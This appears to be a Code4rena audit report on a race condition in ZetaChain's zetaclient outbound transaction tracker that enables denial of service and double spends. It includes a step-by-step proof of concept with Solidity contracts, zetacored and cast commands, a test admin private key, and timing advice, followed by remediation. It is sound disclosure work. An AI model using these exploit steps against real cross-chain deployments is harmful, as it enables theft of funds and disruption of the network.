# [H] Outbound Confirmation Tracker Race Condition Leads to a Double Spend

## Summary
Severity: High
Chain: Smart contract
Component: 2023-11-zetachain
Published: 2023-12-15
Source: https://github.com/code-423n4/2023-11-zetachain-findings/issues/338
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L610
https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L295


# Vulnerability details

## Impact
In the Zellic audit, the report ``3.2 Bonded validators can trigger reverts for successful transactions`` points out that the ``RemoveFromOutTxTracker`` can be called by any bonded validator. They mention this as being an issue then mention an exploit path to use, which is the focus of that finding. The ``RemoveFromOutTxTracker`` issue resulting from bad access control issue was remediated, however there is another way to use the same exploit.
  
Their method of exploitation is as follows: 

1. Create a CCTX from one EVM chain to a different EVM chain, transferring ZETA
2. Process the incoming event so that it's put into the ``PendingOutbound`` state. 
3. The zetaclient signs the transaction with the ``TryProcessOutTx`` then broadcasts this to the EVM. Right after the voting, the zetaclient will also add the transaction to the ``OutboundTxTracker``. 
4. Call ``RemoveFromOutTxTracker`` to remove the outbound transaction so that the Zetaclient will never see it. While this exact method is fixed, we can replicate the *removal* with a race condition that will be described below.
5. Call ``AddToOutTxTracker`` where the same nonce as the transaction from the TSS address. Make this a reverted transaction so that we trick the processing to eventually call ``onRevert``. 
6. ``observeTxOut`` picks up the FAKE transaction as being reverted, even though it actually succeeded. This will put the tx into the ``ob.outTXConfirmationTransaction`` and ``ob.outTXConfirmationReceipts`` structure. 
7. With the transactions and receipt in the structures, another thread calls ``PostReceiveConfirmation`` on our fake transaction as being reverted. After enough of these, a vote passes that validates that the transaction did in fact fail.
8. The revert flow will occur. This will send us back the funds on the EVM chain even though they were already sent once in the original transaction.
  
By adding a reverted transaction to the ``OutTxTracker`` at just the right moment, it is possible to cause a **race condition** where the real transaction is broadcasted to the outbound chain but the wrong tx is processed through the queue for the ``OutTracker``. This is able to replicate the effect of step 4 of the Zellic method, since we can get our fake transaction processed *first* in the voting process. The timing for performing a double spend is very tight though. In particular, the function must be within the *signing* process of our CCTX but has NOT added the TX to the outbound queue yet when we add the function to the ``OutTxTracker``. If this is done, a double spend will occur. However, causing a denial of service by sending the fake transaction as soon as possible is trivial. We were able to replicate the double spend a few times but got the denial of service every time. The double spend has a [video](https://www.youtube.com/watch?v=i360xH6ex_4) below since it is hard to trigger.
  
The real issue stems from the items going into the ``ob.outTXConfirmationTransaction`` and ``ob.outTXConfirmationReceipts`` structure without the *events* ever being validated properly. Additionally, only the *first* item within a given ``OutTxTracker`` is ever used. The only item that is validated on the processing is that the *nonce* of the transaction matches the nonce of the TSS CCTX. However, this is trivial to bypass using a different key.
  
Another interesting point is *who* can trigger the vulnerability. For testing, we mostly used an observer because we never got the *proof* functionality working. To our understanding, this provides three checks: 
* The ``To()`` must be to the connector address.
* The block header for the TX must be uploaded. This means that the confirmation point must be reached. 
* The TX must be valid and occurred. 

All of these are trivial to bypass. First, we simply send a transaction to the ``connector`` that fails for whatever reason, which satisfies part 1. Part 2 can be bypassed by simply waiting for enough blocks on our fake transaction. Part 3 can be bypassed by using a valid proof, which should be easy to do. 

All of this together means that any user can exploit the double spend but it's much easier for observers to do, since no proof is required. This was only tested on Ethereum but may also work on Bitcoin as well. This vulnerability is live on the existing system.

## Proof of Concept 
### Setup
The setup for exploitation on this is complicated within the test environment. Messing up a single step will make this not work. If there is difficultly in reproducing, please reach out and we can demonstrate it. Here is a [video](https://www.youtube.com/watch?v=i360xH6ex_4) of the exploit occurring as well.
- Easy way to get ``ZETA`` for testing. This is shown in the steps below.
- An account that is at the same nonce as the TSS address. Be careful of off by 1 errors here, as ``cast`` from foundry shows the NEXT nonce and not the nonce of the previous transaction. 
  
To demonstrate the exploitabilty of this, we will show the denial of service to block an incoming transaction. Additionally, we will use the ``observer`` instead of a regular user so that we do not have to specify proofs. However, this can be used for a double spend by any user, given the proper timing and proof. It is recommended to read the steps ahead of time because the *timing* of everything is crucial. To make this easier, prepare the commands in a terminal to be ready to go.

### Exploit Steps for DoS
1. Get the nonce of the next CCTX. This can be done using the ``zetacored`` binary. A command with ``zetacored`` and jq is used below: 
    ```
    zetacored query crosschain list-chain-nonces -o json  | jq '.ChainNonces[] | select(.chain_id == "1337") | .nonce' -r
    ```
2. Using some private key, get a transaction to fail using the **same nonce as the TSS address** above. There is a security check that we need to bypass using this. To do this, I deployed the following contract and called it multiple times until the reverted transaction matched the nonce. Keep the hash that reverted for later. 
    ```
    contract ForcedRevert {
        function revertMe() external {
                revert("Bad!");
        }
    }
    ```

3. Deploy the following contract. The ``ZetaInteractor`` and ``ZetaReceiver`` interfaces can be imported or copied in. For our testing, we mostly used Remix so we copied the necessary contracts in.
```
contract DoubleSpend is ZetaInteractor, ZetaReceiver {

    IERC20 _zetaToken;
    uint256 public calledMessage = 0;
    uint256 public calledRevert = 0;
    bytes32 public constant CROSS_CHAIN_MESSAGE_MESSAGE_TYPE =
        keccak256("CROSS_CHAIN_CROSS_CHAIN_MESSAGE");

    // 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9, 0xA8D5060feb6B456e886F023709A2795373691E63
    constructor(
        address connectorAddress,
        address zetaTokenAddress
    ) ZetaInteractor(connectorAddress) {
        _zetaToken = IERC20(zetaTokenAddress);
    }

    function onZetaMessage(ZetaInterfaces.ZetaMessage calldata zetaMessage) external override{
        calledMessage += 1; 
    }

    function onZetaRevert(ZetaInterfaces.ZetaRevert calldata zetaRevert) external override{
        calledRevert += 1;
    }   


    function TriggerBug () public payable{
        uint256 destinationChainId = 1337;
        uint256 zetaValueAndGas = _zetaToken.balanceOf(address(this)) / 4; 

        _zetaToken.approve(address(connector), zetaValueAndGas);
        
        // Make the CCTX
        connector.send(
            ZetaInterfaces.SendInput({
                destinationChainId: destinationChainId,
                destinationAddress: abi.encodePacked(address(this)), // Send to ourselves
                destinationGasLimit: 300000,
                message: abi.encode(CROSS_CHAIN_MESSAGE_MESSAGE_TYPE, "Hey!"),
                zetaValueAndGas: zetaValueAndGas,
                zetaParams: abi.encode("")
            })
        );
    }
}
```
4. Give the contract 50 ZETA for the test. An easy way to do this is using the admin private key to change the TSS address of the user to itself then sending the ZETA.
    ```bash
    ## Update the TSS to a controlled user 
    cast send 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9 "function updateTssAddress(address tssAddress_)" 0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263

    ## Call to change the information there 
    cast send 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9 "function onReceive(bytes calldata zetaTxSenderAddress, uint256 sourceChainId, address destinationAddress, uint256 zetaValue, bytes calldata message,bytes32 internalSendHash)" "" 1337 <CONTRACT_ADDRESS> 50000000000000000000 "" 0x0000000000000000000000000000000000000000000000000000000000000001 --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263

    # Update back in the TSS address
    cast send 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9 "function updateTssAddress(address tssAddress_)" <TSS_ETH_KEY> --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263
    ```

5. Execute the function ``TriggerBug()`` with the address of the deployed contract. This will trigger the CCTX that we need to exploit this issue.
6. Wait for the transaction to be in the ``PendingOutbound`` state. This can be queried using the command ``zetacored query crosschain list-pending-cctx 1337``. 
7. As soon as the transaction goes into the ``PendingOutbound`` state, add it to the OutTracker queue. It is super important that our transaction is added BEFORE the real one is put in by the zetaclient. This is because the first transaction in the queue is the first one processed. To attempt a double spend, change the timing to be slightly later. We found that 5 seconds seems like the magic number but it was very inconsistent. An example command to add the hash to the queue is shown below:

    ```
    zetacored tx crosschain add-to-out-tx-tracker 1337 <TSS NONCE> <HASH> --from `zetacored keys list --output json | jq '.[0].address' -r` --yes --fees 10000azeta
    ```
8. Wait for the transaction to finish. To view pending transaction use the command ``zetacored query crosschain list-pending-cctx 1337``.
9. Query all CCTXs to see the status of the TX. This can be done with the following command to search for a given nonce: 

    ```
    zetacored query crosschain list-cctx 1337 -o json | jq '.CrossChainTx[] | select(.outbound_tx_params[0].outbound_tx_tss_nonce == "<NONCE>")'
    ```
10. Notice that the "status" of the transaction is ``reverted`` with TWO outbound params instead of one. This indicates that we were able to set the state of the transaction, even though it was the wrong one. Sometimes, doing this can stop the environment from working or get transactions stuck as well. This all depends on the timing in which this occurred.

```
  "cctx_status": {
    "status": "Reverted",
    ...
  },
```

11. If you were going for the double spend, check the balance of the contract and notice that it is larger than the balance before. A [video](https://www.youtube.com/watch?v=i360xH6ex_4) of the double spend being explained can used as well.

## Remediation 
The crux of the original issue was not the bad permissions of the ``RemoveFromOutTxTracker`` message but certainly makes it much easier to exploit. To remediate this, we need to fix the underlying problem of the Zellic exploit method.
  
The ``ob.outTXConfirmationTransaction`` and ``ob.outTXConfirmationReceipts`` variables do not validate the events associated with the transaction hash. There is an assumption that the transaction hash presented matches the nonce that was provided, which is not necessarily true. 
  
There are few things that need to be fixed. To prevent the double spend by tricking the program to see a reverted transaction, the ``from`` of the TSS needs to be checked to be the ``tss address``. Otherwise, it is possible to trick the processing to use the wrong transaction. 
  
To prevent a denial of service using this technique is a bit more complicated. Currently, the *first* of the item put into the ``OutTxTracker`` is the one that will be processed as the proper one. This is because once the ``ob.outTXConfirmationTransaction`` and ``ob.outTXConfirmationReceipts`` objects are set, they cannot be *updated*. Iterating over all of the items in the list would remediate this issue. It would require some rework of the program in order to do though.

This still may be insufficient but we couldn't find a workaround for these. The usage of the multi-threaded code makes this very hard to follow. It is recommended that the Zetachain team takes a long look at how this works to ensure there aren't other exploit methods.








## Assessed type

Timing
